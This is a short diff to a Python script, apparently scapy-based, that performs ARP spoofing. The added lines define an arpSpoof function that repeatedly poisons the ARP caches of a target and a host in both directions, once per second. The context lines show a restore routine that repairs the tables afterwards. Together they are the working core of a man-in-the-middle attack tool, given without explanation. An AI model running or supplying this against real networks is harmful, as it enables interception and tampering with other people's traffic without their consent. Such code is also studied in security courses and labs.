@@ -34,3 +34,10 @@ def restore(target_ip, gateway_ip, verbose=True):
 	send(arp_response, verbose=0, count=7)
 	if verbose:
 		print("Sent to {} : {} is-at {}".format(target_ip, gateway_ip, gateway_mac))
+
+
+def arpSpoof(target, host, verbose):
+	while True:
+		spoof(target, host, verbose)
+		spoof(host, target, verbose)
+		time.sleep(1)
